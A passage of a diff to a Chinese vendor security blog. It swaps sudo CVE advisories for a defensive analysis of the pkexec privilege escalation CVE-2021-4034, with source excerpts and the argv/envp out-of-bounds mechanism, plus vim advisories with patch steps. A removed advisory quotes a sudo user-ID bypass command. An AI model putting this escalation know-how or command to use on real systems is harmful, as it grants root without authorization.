@@ -64,10 +64,10 @@
       <div class="outer">
         <section id="main">
   
-    <article id="post-cve-2021-3156安全公告" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-CVE-2021-4034分析报告" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2022/03/10/cve-2021-3156%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" class="article-date">
-  <time datetime="2022-03-10T07:37:32.000Z" itemprop="datePublished">2022-03-10</time>
+    <a href="/2022/03/24/CVE-2021-4034%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/" class="article-date">
+  <time datetime="2022-03-24T05:18:16.000Z" itemprop="datePublished">2022-03-24</time>
 </a>
     
   </div>
@@ -78,7 +78,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2022/03/10/cve-2021-3156%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/">cve-2021-3156安全公告</a>
+      <a class="article-title" href="/2022/03/24/CVE-2021-4034%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/">CVE-2021-4034分析报告</a>
     </h1>
   
 
@@ -86,18 +86,47 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="NFS-SA-2022-03-sudo安全更新"><a href="#NFS-SA-2022-03-sudo安全更新" class="headerlink" title="NFS-SA-2022-03: sudo安全更新"></a>NFS-SA-2022-03: sudo安全更新</h2><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Sudo before 1.9.5p2 contains an off-by-one error that can result in a heap-based buffer overflow, which allows privilege escalation to root via “sudoedit -s” and a command-line argument that ends with a single backslash character.</p>
-<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><h3 id="漏洞编号：-CVE-2021-3156"><a href="#漏洞编号：-CVE-2021-3156" class="headerlink" title="漏洞编号： CVE-2021-3156"></a>漏洞编号： CVE-2021-3156</h3><h3 id="软件包名：-sudo"><a href="#软件包名：-sudo" class="headerlink" title="软件包名： sudo"></a>软件包名： sudo</h3><h3 id="CVSS3-1评分：7-8"><a href="#CVSS3-1评分：7-8" class="headerlink" title="CVSS3.1评分：7.8"></a>CVSS3.1评分：7.8</h3><h3 id="漏洞评级：高危"><a href="#漏洞评级：高危" class="headerlink" title="漏洞评级：高危"></a>漏洞评级：高危</h3><h2 id="受影响NFS版本"><a href="#受影响NFS版本" class="headerlink" title="受影响NFS版本"></a>受影响NFS版本</h2><h3 id="NFS4-0-NFS3-1"><a href="#NFS4-0-NFS3-1" class="headerlink" title="NFS4.0 NFS3.1"></a>NFS4.0 NFS3.1</h3><h3 id="更新包下载地址"><a href="#更新包下载地址" class="headerlink" title="更新包下载地址"></a>更新包下载地址</h3><p>待定</p>
-<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>升级到sudo_1.8.19p1-2.1+deb9u3（待定，这是上游的版本）</p>
-<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p><a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/cve-2021-3156">https://nvd.nist.gov/vuln/detail/cve-2021-3156</a></p>
+        <h3 id="发现"><a href="#发现" class="headerlink" title="发现"></a>发现</h3><p>公司的安全团队发现国外的Qualys安全团队公布了policykit的提权漏洞CVE-2021-4034，该漏洞可以让任何用户提权为root用户。该漏洞cvss评分为7.8，为高危漏洞。</p>
+<h3 id="确认"><a href="#确认" class="headerlink" title="确认"></a>确认</h3><p>系统默认policykit版本为 0.105-18+1cdos2，存在该漏洞。</p>
+<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Polkit是一个应用程序级别的工具集，通过定义和审核权限规则，实现不同优先级进程间的通讯：控制决策集中在统一的框架之中，决定低优先级进程是否有权访问高优先级进程。</p>
+<p>Polkit在系统层级进行权限控制，提供了一个低优先级进程和高优先级进程进行通讯的系统。和 sudo 等程序不同，Polkit 并没有赋予进程完全的 root 权限，而是通过一个集中的策略系统进行更精细的授权。</p>
+<p>Polkit定义出一系列操作，例如运行 GParted, 并将用户按照群组或用户名进行划分，例如 wheel 群组用户。然后定义每个操作是否可以由某些用户执行，执行操作前是否需要一些额外的确认，例如通过输入密码确认用户是不是属于某个群组。</p>
+<p>由于Polkit的 Pkexec工具中存在一处本地权限提升漏洞，致使攻击者可以通过控制环境变量，从而诱导Pkexec执行任意代码。利用成功后，可导致非特权用户获得管理员权限。</p>
+<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>在Pkexec工具的 main() 函数中，首先会使用如下代码处理所接收的命令行参数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">opt_show_help = FALSE;</span><br><span class="line">opt_show_version = FALSE;</span><br><span class="line">opt_disable_internal_agent = FALSE;</span><br><span class="line">for (n = 1; n &lt; (guint) argc; n++)</span><br><span class="line">  &#123;</span><br><span class="line">    if (strcmp (argv[n], &quot;--help&quot;) == 0)</span><br><span class="line">      &#123;</span><br><span class="line">        opt_show_help = TRUE;</span><br><span class="line">      &#125;</span><br><span class="line">    else if (strcmp (argv[n], &quot;--version&quot;) == 0)</span><br><span class="line">      &#123;</span><br><span class="line">        opt_show_version = TRUE;</span><br><span class="line">      &#125;</span><br><span class="line">    else if (strcmp (argv[n], &quot;--user&quot;) == 0 || strcmp (argv[n], &quot;-u&quot;) == 0)</span><br><span class="line">      &#123;</span><br><span class="line">        n++;</span><br><span class="line">        if (n &gt;= (guint) argc)</span><br><span class="line">          &#123;</span><br><span class="line">            usage (argc, argv);</span><br><span class="line">            goto out;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">        if (opt_user != NULL)</span><br><span class="line">          &#123;</span><br><span class="line">            g_printerr (&quot;--user specified twice\n&quot;);</span><br><span class="line">            goto out;</span><br><span class="line">          &#125;</span><br><span class="line">        opt_user = g_strdup (argv[n]);</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>
+
+<p>代码将判断传入的参数是否为绝对路径，如果给出非绝对路径，Pkexec工具也将尝试在 path 中定位程序，具体的做法是在PATH 环境变量的目录中搜索要执行的程序。具体的代码如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">if (path[0] != &#x27;/&#x27;)</span><br><span class="line">    &#123;</span><br><span class="line">      /* g_find_program_in_path() is not suspectible to attacks via the environment */</span><br><span class="line">      s = g_find_program_in_path (path);</span><br><span class="line">      if (s == NULL)</span><br><span class="line">        &#123;</span><br><span class="line">          g_printerr (&quot;Cannot run program %s: %s\n&quot;, path, strerror (ENOENT));</span><br><span class="line">          goto out;</span><br><span class="line">        &#125;</span><br><span class="line">      g_free (path);</span><br><span class="line">      argv[n] = path = s;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果命令行参数argc的数量为 0，这意味着如果传递给execve()的参数列表 argv为空，那么 argv[0]将为 NULL，是参数列表的终止符，这将导致：</p>
+<p>Pkexec代码中，整数 n 设置为 1；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for (n = 1; n &lt; (guint) argc; n++)</span><br></pre></td></tr></table></figure>
+
+<p>从 argv[1] 越界读取指针路径；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">path = g_strdup (argv[n]);</span><br></pre></td></tr></table></figure>
+
+<p>指针 s 被越界写入argv[1] ；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">argv[n] = path = s;</span><br></pre></td></tr></table></figure>
+
+<p>由于argv和envp 指针在内存中是连续的，如果 argc 为 0，那么越界argv[1] 实际上是 envp[0]，即为指向我们的第一个环境变量“value”的指针。最终导致：</p>
+<p>将要执行的程序的路径从argv[1]（即envp[0]）中越界读取，并指向“value”；</p>
+<p>由于“value”不是以斜线开头，因此将这个 “value”传递给 g_find_program_in_path()</p>
+<p>随后，g_find_program_in_path() 在PATH 环境变量目录中搜索一个名为“value”的可执行文件。如果找到这样的可执行文件，则将其完整路径返回给 pkexec的 main() 函数。</p>
+<p>最后，这个完整路径被越界写入 argv[1]（即 envp[0]），从而覆盖了我们的第一个环境变量。</p>
+<h3 id="复现方法"><a href="#复现方法" class="headerlink" title="复现方法"></a>复现方法</h3><p>已提供poc，复现方式如图</p>
+<p><img src="./CVE-2021-4034%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/cve-2021-4034%E5%A4%8D%E7%8E%B0.png" alt="cve-2021-4034复现"></p>
+<h3 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h3><p>此漏洞影响范围很大，policykit维护团队很快就公布了修复补丁，修复方案为将上游补丁打到我们的包上。</p>
+<h3 id="修复补丁"><a href="#修复补丁" class="headerlink" title="修复补丁"></a>修复补丁</h3><p>修复补丁如下图</p>
+<p><img src="./CVE-2021-4034%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/cve-2021-4034%E4%BF%AE%E5%A4%8D.jpeg" alt="cve-2021-4034修复"></p>
+<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>经过测试，修复完成之后已经无法复现该漏洞。</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2022/03/10/cve-2021-3156%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" data-id="cl11k4ysy0008b214dgyseklc" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2022/03/24/CVE-2021-4034%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/" data-id="cl14vrp0p000l6x149p1fe4eb" class="article-share-link">Share</a>
       
       
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve/" rel="tag">cve</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sudo/" rel="tag">sudo</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" rel="tag">安全公告</a></li></ul>
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve/" rel="tag">cve</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/policykit/" rel="tag">policykit</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="tag">漏洞分析</a></li></ul>
 
     </footer>
   </div>
@@ -106,10 +135,10 @@
 
 
   
-    <article id="post-cve-2019-18634安全公告" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-CVE-2022-0318安全公告" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2022/03/10/cve-2019-18634%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" class="article-date">
-  <time datetime="2022-03-10T06:30:51.000Z" itemprop="datePublished">2022-03-10</time>
+    <a href="/2022/03/23/CVE-2022-0318%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" class="article-date">
+  <time datetime="2022-03-23T09:16:21.000Z" itemprop="datePublished">2022-03-23</time>
 </a>
     
   </div>
@@ -120,7 +149,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2022/03/10/cve-2019-18634%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/">cve-2019-18634分析报告</a>
+      <a class="article-title" href="/2022/03/23/CVE-2022-0318%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/">CVE-2022-0318安全公告</a>
     </h1>
   
 
@@ -128,57 +157,39 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="NFS-SA-2022-03-sudo安全更新"><a href="#NFS-SA-2022-03-sudo安全更新" class="headerlink" title="NFS-SA-2022-03: sudo安全更新"></a>NFS-SA-2022-03: sudo安全更新</h2><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>In Sudo before 1.8.26, if pwfeedback is enabled in /etc/sudoers, users can trigger a stack-based buffer overflow in the privileged sudo process. (pwfeedback is a default setting in Linux Mint and elementary OS; however, it is NOT the default for upstream and many other packages, and would exist only if enabled by an administrator.) The attacker needs to deliver a long string to the stdin of getln() in tgetpass.c.</p>
-<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><h3 id="漏洞编号：-CVE-2019-18634"><a href="#漏洞编号：-CVE-2019-18634" class="headerlink" title="漏洞编号： CVE-2019-18634"></a>漏洞编号： CVE-2019-18634</h3><h3 id="软件包名：-sudo"><a href="#软件包名：-sudo" class="headerlink" title="软件包名： sudo"></a>软件包名： sudo</h3><h3 id="CVSS3-1评分：7-8"><a href="#CVSS3-1评分：7-8" class="headerlink" title="CVSS3.1评分：7.8"></a>CVSS3.1评分：7.8</h3><h3 id="漏洞评级：高危"><a href="#漏洞评级：高危" class="headerlink" title="漏洞评级：高危"></a>漏洞评级：高危</h3><h2 id="受影响NFS版本"><a href="#受影响NFS版本" class="headerlink" title="受影响NFS版本"></a>受影响NFS版本</h2><h3 id="NFS4-0-NFS3-1"><a href="#NFS4-0-NFS3-1" class="headerlink" title="NFS4.0 NFS3.1"></a>NFS4.0 NFS3.1</h3><h3 id="更新包下载地址"><a href="#更新包下载地址" class="headerlink" title="更新包下载地址"></a>更新包下载地址</h3><p>待定</p>
-<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>升级到sudo_1.8.19p1-2.1+deb9u3（待定，这是上游的版本）</p>
-<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p><a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/cve-2019-18634">https://nvd.nist.gov/vuln/detail/cve-2019-18634</a></p>
+        <h2 id="NFS-SA-2022-03-vim安全更新"><a href="#NFS-SA-2022-03-vim安全更新" class="headerlink" title="NFS-SA-2022-03: vim安全更新"></a>NFS-SA-2022-03: vim安全更新</h2><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>系统现版本的vim的ops.c中存在一个缓冲区溢出漏洞，该漏洞是由于读取超出utf_head_off函数中的一行末尾而导致的。该漏洞允许攻击者输入特殊构建的文件，从而导致崩溃或代码执行。</p>
+<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><h3 id="漏洞编号：-CVE-2022-0318"><a href="#漏洞编号：-CVE-2022-0318" class="headerlink" title="漏洞编号： CVE-2022-0318"></a>漏洞编号： CVE-2022-0318</h3><h3 id="软件包名：-vim"><a href="#软件包名：-vim" class="headerlink" title="软件包名： vim"></a>软件包名： vim</h3><h3 id="CVSS3-1评分：7-8"><a href="#CVSS3-1评分：7-8" class="headerlink" title="CVSS3.1评分：7.8"></a>CVSS3.1评分：7.8</h3><h3 id="漏洞评级：高危"><a href="#漏洞评级：高危" class="headerlink" title="漏洞评级：高危"></a>漏洞评级：高危</h3><h2 id="受影响NFS版本"><a href="#受影响NFS版本" class="headerlink" title="受影响NFS版本"></a>受影响NFS版本</h2><h3 id="方德桌面操作系统V3-1-方德桌面操作系统V4-0"><a href="#方德桌面操作系统V3-1-方德桌面操作系统V4-0" class="headerlink" title="方德桌面操作系统V3.1   方德桌面操作系统V4.0"></a>方德桌面操作系统V3.1   方德桌面操作系统V4.0</h3><h3 id="更新包下载地址"><a href="#更新包下载地址" class="headerlink" title="更新包下载地址"></a>更新包下载地址</h3><p>待定</p>
+<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>升级到 vim_8.0.0197-4+deb9u5 （待定，这是上游的版本）</p>
+<p>方法一：在线更新</p>
+<ol>
+<li>添加以下行到安装源配置文件中</li>
+</ol>
+<p>方德桌面操作系统V3.1添加如下行到/etc/apt/sources.list.d/official-package-repositories.list文件中：<br>deb <a target="_blank" rel="noopener" href="http://update.os.nfschina.com/static/nfs-3.1-security/">http://update.os.nfschina.com/static/nfs-3.1-security/</a> base main</p>
+<p>方德桌面操作系统V4.0添加如下行到/etc/apt/sources.list.d/official-package-repositories.list文件中：<br>deb <a target="_blank" rel="noopener" href="http://update.os.nfschina.com/static/nfs-4.0-security/">http://update.os.nfschina.com/static/nfs-4.0-security/</a> base main</p>
+<p>方德桌面操作系统V4.0曙光版本添加如下行到/etc/apt/sources.list.d/official-package-repositories.list文件中：<br>deb <a target="_blank" rel="noopener" href="http://update.os.nfschina.com/static/nfs-4.0-sg-security/">http://update.os.nfschina.com/static/nfs-4.0-sg-security/</a> base main</p>
+<ol start="2">
+<li>执行源同步命令，命令如下：</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>执行安装更新命令，命令如下：</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install vim</span><br></pre></td></tr></table></figure>
+
+<p>方法二：下载安装包进行升级安装</p>
+<p>通过下面的“软件更新”中的地址下载软件包，使用本地安装命令进行升级安装,命令如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo dpkg -i Packagename</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>升级完成后是否需要重启服务或操作系统：<br>无需重启操作系统与服务即可使漏洞修复生效。</li>
+</ol>
+<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p><a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2022-0318">https://nvd.nist.gov/vuln/detail/CVE-2022-0318</a></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2022/03/10/cve-2019-18634%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" data-id="cl11k4yt0000cb214g48m5pqb" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve/" rel="tag">cve</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sudo/" rel="tag">sudo</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" rel="tag">安全公告</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-cve-2019-14287安全公告" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2022/03/10/cve-2019-14287%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" class="article-date">
-  <time datetime="2022-03-10T06:30:37.000Z" itemprop="datePublished">2022-03-10</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/03/10/cve-2019-14287%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/">cve-2019-14287分析报告</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="NFS-SA-2022-03-sudo安全更新"><a href="#NFS-SA-2022-03-sudo安全更新" class="headerlink" title="NFS-SA-2022-03: sudo安全更新"></a>NFS-SA-2022-03: sudo安全更新</h2><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>In Sudo before 1.8.28, an attacker with access to a Runas ALL sudoer account can bypass certain policy blacklists and session PAM modules, and can cause incorrect logging, by invoking sudo with a crafted user ID. For example, this allows bypass of !root configuration, and USER= logging, for a “sudo -u #$((0xffffffff))” command.</p>
-<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><h3 id="漏洞编号：-CVE-2019-14287"><a href="#漏洞编号：-CVE-2019-14287" class="headerlink" title="漏洞编号： CVE-2019-14287"></a>漏洞编号： CVE-2019-14287</h3><h3 id="软件包名：-sudo"><a href="#软件包名：-sudo" class="headerlink" title="软件包名： sudo"></a>软件包名： sudo</h3><h3 id="CVSS3-1评分：8-8"><a href="#CVSS3-1评分：8-8" class="headerlink" title="CVSS3.1评分：8.8"></a>CVSS3.1评分：8.8</h3><h3 id="漏洞评级：高危"><a href="#漏洞评级：高危" class="headerlink" title="漏洞评级：高危"></a>漏洞评级：高危</h3><h2 id="受影响NFS版本"><a href="#受影响NFS版本" class="headerlink" title="受影响NFS版本"></a>受影响NFS版本</h2><h3 id="NFS4-0-NFS3-1"><a href="#NFS4-0-NFS3-1" class="headerlink" title="NFS4.0 NFS3.1"></a>NFS4.0 NFS3.1</h3><h3 id="更新包下载地址"><a href="#更新包下载地址" class="headerlink" title="更新包下载地址"></a>更新包下载地址</h3><p>待定</p>
-<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>升级到sudo_1.8.19p1-2.1+deb9u3（待定，这是上游的版本）</p>
-<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p><a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/cve-2019-14287">https://nvd.nist.gov/vuln/detail/cve-2019-14287</a></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2022/03/10/cve-2019-14287%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" data-id="cl11k4ysw0004b2140uzk80sm" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2022/03/23/CVE-2022-0318%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" data-id="cl14vrp0z001b6x14co12diiw" class="article-share-link">Share</a>
       
       
     </footer>
@@ -188,10 +199,10 @@
 
 
   
-    <article id="post-cve-2017-1000368安全公告" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-CVE-2022-0261安全公告" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2022/03/10/cve-2017-1000368%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" class="article-date">
-  <time datetime="2022-03-10T06:30:16.000Z" itemprop="datePublished">2022-03-10</time>
+    <a href="/2022/03/23/CVE-2022-0261%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" class="article-date">
+  <time datetime="2022-03-23T09:08:17.000Z" itemprop="datePublished">2022-03-23</time>
 </a>
     
   </div>
@@ -202,7 +213,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2022/03/10/cve-2017-1000368%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/">cve-2017-1000368分析报告</a>
+      <a class="article-title" href="/2022/03/23/CVE-2022-0261%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/">CVE-2022-0261安全公告</a>
     </h1>
   
 
@@ -210,19 +221,41 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="NFS-SA-2022-03-sudo安全更新"><a href="#NFS-SA-2022-03-sudo安全更新" class="headerlink" title="NFS-SA-2022-03: sudo安全更新"></a>NFS-SA-2022-03: sudo安全更新</h2><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Todd Miller’s sudo version 1.8.20p1 and earlier is vulnerable to an input validation (embedded newlines) in the get_process_ttyname() function resulting in information disclosure and command execution.</p>
-<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><h3 id="漏洞编号：-CVE-2017-1000368"><a href="#漏洞编号：-CVE-2017-1000368" class="headerlink" title="漏洞编号： CVE-2017-1000368"></a>漏洞编号： CVE-2017-1000368</h3><h3 id="软件包名：-sudo"><a href="#软件包名：-sudo" class="headerlink" title="软件包名： sudo"></a>软件包名： sudo</h3><h3 id="CVSS3-1评分：8-2"><a href="#CVSS3-1评分：8-2" class="headerlink" title="CVSS3.1评分：8.2"></a>CVSS3.1评分：8.2</h3><h3 id="漏洞评级：高危"><a href="#漏洞评级：高危" class="headerlink" title="漏洞评级：高危"></a>漏洞评级：高危</h3><h2 id="受影响NFS版本"><a href="#受影响NFS版本" class="headerlink" title="受影响NFS版本"></a>受影响NFS版本</h2><h3 id="NFS4-0-NFS3-1"><a href="#NFS4-0-NFS3-1" class="headerlink" title="NFS4.0 NFS3.1"></a>NFS4.0 NFS3.1</h3><h3 id="更新包下载地址"><a href="#更新包下载地址" class="headerlink" title="更新包下载地址"></a>更新包下载地址</h3><p>待定</p>
-<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>升级到sudo_1.8.19p1-2.1+deb9u3（待定，这是上游的版本）</p>
-<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p><a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/cve-2017-1000368">https://nvd.nist.gov/vuln/detail/cve-2017-1000368</a></p>
+        <h2 id="NFS-SA-2022-03-vim安全更新"><a href="#NFS-SA-2022-03-vim安全更新" class="headerlink" title="NFS-SA-2022-03: vim安全更新"></a>NFS-SA-2022-03: vim安全更新</h2><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>系统现版本的vim的ops.c中存在一个越界写入漏洞，该漏洞允许攻击者诱骗用户打开精心编制的文件，从而触发越界写入。此漏洞可能导致软件崩溃、修改内存以及可能的代码执行。</p>
+<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><h3 id="漏洞编号：-CVE-2022-0261"><a href="#漏洞编号：-CVE-2022-0261" class="headerlink" title="漏洞编号： CVE-2022-0261"></a>漏洞编号： CVE-2022-0261</h3><h3 id="软件包名：-vim"><a href="#软件包名：-vim" class="headerlink" title="软件包名： vim"></a>软件包名： vim</h3><h3 id="CVSS3-1评分：7-8"><a href="#CVSS3-1评分：7-8" class="headerlink" title="CVSS3.1评分：7.8"></a>CVSS3.1评分：7.8</h3><h3 id="漏洞评级：高危"><a href="#漏洞评级：高危" class="headerlink" title="漏洞评级：高危"></a>漏洞评级：高危</h3><h2 id="受影响NFS版本"><a href="#受影响NFS版本" class="headerlink" title="受影响NFS版本"></a>受影响NFS版本</h2><h3 id="方德桌面操作系统V3-1-方德桌面操作系统V4-0"><a href="#方德桌面操作系统V3-1-方德桌面操作系统V4-0" class="headerlink" title="方德桌面操作系统V3.1   方德桌面操作系统V4.0"></a>方德桌面操作系统V3.1   方德桌面操作系统V4.0</h3><h3 id="更新包下载地址"><a href="#更新包下载地址" class="headerlink" title="更新包下载地址"></a>更新包下载地址</h3><p>待定</p>
+<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>升级到 vim_8.0.0197-4+deb9u5 （待定，这是上游的版本）</p>
+<p>方法一：在线更新</p>
+<ol>
+<li>添加以下行到安装源配置文件中</li>
+</ol>
+<p>方德桌面操作系统V3.1添加如下行到/etc/apt/sources.list.d/official-package-repositories.list文件中：<br>deb <a target="_blank" rel="noopener" href="http://update.os.nfschina.com/static/nfs-3.1-security/">http://update.os.nfschina.com/static/nfs-3.1-security/</a> base main</p>
+<p>方德桌面操作系统V4.0添加如下行到/etc/apt/sources.list.d/official-package-repositories.list文件中：<br>deb <a target="_blank" rel="noopener" href="http://update.os.nfschina.com/static/nfs-4.0-security/">http://update.os.nfschina.com/static/nfs-4.0-security/</a> base main</p>
+<p>方德桌面操作系统V4.0曙光版本添加如下行到/etc/apt/sources.list.d/official-package-repositories.list文件中：<br>deb <a target="_blank" rel="noopener" href="http://update.os.nfschina.com/static/nfs-4.0-sg-security/">http://update.os.nfschina.com/static/nfs-4.0-sg-security/</a> base main</p>
+<ol start="2">
+<li>执行源同步命令，命令如下：</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>执行安装更新命令，命令如下：</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install vim</span><br></pre></td></tr></table></figure>
+
+<p>方法二：下载安装包进行升级安装</p>
